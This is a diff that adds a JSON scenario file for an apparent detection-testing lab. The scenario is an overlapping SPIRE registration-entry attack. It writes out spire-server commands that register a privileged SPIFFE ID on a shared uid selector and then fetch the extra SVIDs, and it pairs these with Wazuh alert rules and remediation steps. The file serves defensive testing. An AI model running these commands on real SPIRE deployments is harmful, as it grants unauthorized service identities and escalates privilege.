@@ -1,0 +1,173 @@
+{
+  "id": "S7-04",
+  "name": "Overlapping Registration Entries",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Create multiple registration entries with identical selectors but different SPIFFE IDs, causing a single workload to receive multiple identities and enabling unauthorized service access",
+  "difficulty": "Hard",
+  "real_world_relevance": "Eviatar Gerzi (CyberArk) demonstrated that SPIRE's selector-based attestation allows entry ambiguity — if two entries share selectors, a workload silently receives SVIDs for both identities, violating least-privilege",
+
+  "mitre_attack": {
+    "tactics": ["Persistence", "Privilege Escalation"],
+    "techniques": [
+      {"id": "T1098", "name": "Account Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker with SPIRE Server registration access creates a second entry using the same selectors as an existing workload, causing the workload to receive an additional SVID it was never intended to hold",
+    "diagram": [
+      "1. Enumerate existing registration entries to identify target workload",
+      "2. Analyze the target entry's selectors (e.g., unix:uid:1000 + unix:path:/usr/bin/app)",
+      "3. Create a new entry with the SAME selectors but a different, privileged SPIFFE ID",
+      "4. Wait for or trigger workload re-attestation on the SPIRE Agent",
+      "5. Workload now receives SVIDs for both its original and the attacker-chosen identity",
+      "6. Verify dual identity by fetching X.509 SVIDs from the Workload API"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Reconnaissance",
+      "description": "Enumerate existing registration entries to find selector overlap targets",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server entry show -socketPath /tmp/spire-server/private/api.sock",
+          "description": "List all registration entries to identify target selectors"
+        }
+      ]
+    },
+    {
+      "name": "Overlapping Entry Creation",
+      "description": "Create a second entry with identical selectors but a different SPIFFE ID",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server entry create -parentID AGENT_ID -spiffeID spiffe://example.org/web-frontend -selector unix:uid:1000 -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create legitimate baseline entry for uid:1000"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server entry create -parentID AGENT_ID -spiffeID spiffe://example.org/payment-service -selector unix:uid:1000 -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create overlapping entry — same selector, different privileged SPIFFE ID"
+        }
+      ]
+    },
+    {
+      "name": "Attestation Trigger",
+      "description": "Force the SPIRE Agent to re-attest and deliver both SVIDs",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -write /tmp/svids/",
+          "description": "Fetch X.509 SVIDs — expect TWO certificates returned for single process"
+        }
+      ]
+    },
+    {
+      "name": "Verification and Detection",
+      "description": "Confirm dual identity and trigger detection",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock 2>&1 | grep -c 'SPIFFE ID'",
+          "description": "Count returned SPIFFE IDs — value > 1 confirms overlapping entry attack"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "python3 /opt/spire-monitor/spire_identity_monitor.py",
+          "description": "Run SPIRE identity monitor to detect multi-identity anomaly"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Registration entry created via BatchCreateEntry API",
+      "wazuh_rule": "101020"
+    },
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Registration entry uses weak/spoofable selector (unix:uid only)",
+      "wazuh_rule": "101021"
+    },
+    {
+      "type": "SPIRE Identity Monitor",
+      "description": "Single PID received SVIDs for multiple distinct SPIFFE IDs",
+      "wazuh_rule": "101006"
+    },
+    {
+      "type": "SPIRE Identity Monitor",
+      "description": "CONFIRMED multi-identity per PID — overlapping entries detected",
+      "wazuh_rule": "101007"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101020",
+      "level": 12,
+      "description": "NHI: SPIRE registration entry created"
+    },
+    {
+      "rule_id": "101021",
+      "level": 12,
+      "description": "NHI: SPIRE registration with weak/spoofable selector"
+    },
+    {
+      "rule_id": "101006",
+      "level": 10,
+      "description": "NHI-SPIRE: TRIAGE - Same PID multiple SVID events"
+    },
+    {
+      "rule_id": "101007",
+      "level": 14,
+      "description": "NHI: CONFIRMED multi-identity per PID — selector spoofing"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Delete the overlapping registration entry",
+      "Rotate SVIDs for all affected workloads",
+      "Audit all registration entries for duplicate selector sets"
+    ],
+    "long_term": [
+      "Enforce composite selectors (uid + path + sha256) to reduce overlap surface",
+      "Implement OPA/Rego admission policies that reject entries sharing selectors with existing entries",
+      "Restrict SPIRE Server registration API to CI/CD pipelines with audit trails",
+      "Deploy the SPIRE identity monitor as a continuous sidecar on all nodes"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "The Machine with Many Faces — Eviatar Gerzi (CyberArk)",
+      "url": "https://nullcon.net/"
+    },
+    {
+      "title": "SPIRE Registration Entry Documentation",
+      "url": "https://spiffe.io/docs/latest/deploying/registering/"
+    },
+    {
+      "title": "SPIFFE/SPIRE Threat Model - Entry Ambiguity",
+      "url": "https://spiffe.io/docs/latest/spire/using/security/"
+    }
+  ]
+}
